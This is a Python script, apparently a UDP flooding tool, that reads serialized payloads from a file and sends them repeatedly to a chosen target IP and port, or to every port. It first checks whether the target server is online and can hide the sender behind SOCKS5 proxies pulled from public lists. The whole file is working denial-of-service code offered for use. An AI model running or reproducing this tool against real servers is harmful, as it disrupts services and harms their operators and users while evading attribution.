import marshal
import random
import socket
import sys
import time
import os
from api import getLocalHostIP, getTime

try:
    import wget
    import socks
    import requests
except:
    print("Import module error! Please run \"pip install -r requirements.txt\"")
    os._exit(1)

localHostIP = getLocalHostIP()


def getOptions():
    try:
        target = sys.argv[1]
        port = sys.argv[2]
        file = sys.argv[3]
        loops = sys.argv[4]
        interval = sys.argv[5]
        isDisplayMotd = sys.argv[6]
        proxyUsed = sys.argv[7]
    except:
        target = input("Target(IP/Domain): ")
        port = input("Port(Number): ")
        file = input("File(Path): ")
        loops = input("Loops(Number): ")
        interval = input("Interval(sec): ")
        isDisplayMotd = input("Display Motd(y/n): ")
        proxyUsed = input("Proxy(y/n): ")
    if proxyUsed == "y":
        try:
            proxyCountry = sys.argv[8]
        except:
            proxyCountry = input("ProxyCountry(like cn, ru, us): ")
        print(f"[{getTime()}] Proxy mode is under development and deprecated!")
        proxyUsed = True
    else:
        proxyUsed = False

    if isDisplayMotd == "y":
        isDisplayMotd = True
    else:
        isDisplayMotd = False
    print()
    return target, int(port), file, int(loops), float(interval), proxyUsed, isDisplayMotd, proxyCountry


target, port, file, loops, interval, proxyUsed, isDisplayMotd, proxyCountry = getOptions()


def getProxy() -> list:
    try:
        print(f"[{getTime()}] Trying to get proxy data from api...")
        proxyInfo = requests.get(
            f"https://www.proxyscan.io/api/proxy?last_check=3600&uptime=&ping=&limit=1&type=socks5&format=json&country={proxyCountry}").json()
        proxyIP = proxyInfo[0]['Ip']
        proxyPort = proxyInfo[0]['Port']
        return proxyIP, int(proxyPort)
    except:
        if not os.path.exists(r"socks5.txt"):
            print(f"[{getTime()}] Request api failed. Downloading proxy list...")
            wget.download(
                "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt")
            print(f"")
            print(f"[{getTime()}] Proxy list downloaded!")
        with open("socks5.txt", "r") as file:
            socksList = file.readlines()
            randomIndex = random.randint(0, len(socksList) - 1)
            proxy = socksList[randomIndex]
            proxyIP, proxyPort = proxy.rsplit(':', 1)
            #print(proxyIP, ":", proxyPort)
            return proxyIP, int(proxyPort)


def createSocket():
    localPort = random.randint(1024, 65535)
    proxyIP, proxyPort = None, None
    if proxyUsed:
        socketSend = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
        proxyIP, proxyPort = getProxy()
        socketSend.set_proxy(socks.SOCKS5, proxyIP, proxyPort)
        if proxyUsed:
            print(f"[{getTime()}] Used proxy: {proxyIP}:{proxyPort}")
    else:
        socketSend = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        socketSend.bind((str(localHostIP), localPort))
    return localPort, socketSend


def sendPacket(target, port, file, loops, interval):
    for i in range(loops):
        try:
            localPort, socketSend = createSocket()
        except:
            continue
        payloads = None
        try:
            payloads = marshal.load(open(file, "rb"))
        except:
            print(f"[{getTime()}] Payload file not found!")
            sys.exit()
        try:
            if isDisplayMotd:
                __import__("motd").sendPacket(target, port)
        except:
            if isDisplayMotd:
                print(f"[{getTime()}] Target server offline.")
        #print(f"[{getTime()}] Sending packet...")
        try:
            if port == "*":
                for port in range(65535):
                    for line in payloads:
                        socketSend.sendto(line, (target, port))
            else:
                for line in payloads:
                    socketSend.sendto(line, (target, int(port)))
            print(f"[{getTime()}] Loop ", str(i),
                  " done, used local port: ", str(localPort), "\n")
        except:
            print(f"[{getTime()}] Loop ", str(i), " error! Skip...", "\n")
            pass
        if i+1 < loops:
            time.sleep(interval)


if __name__ == "__main__":
    sendPacket(target, port, file, loops, interval)
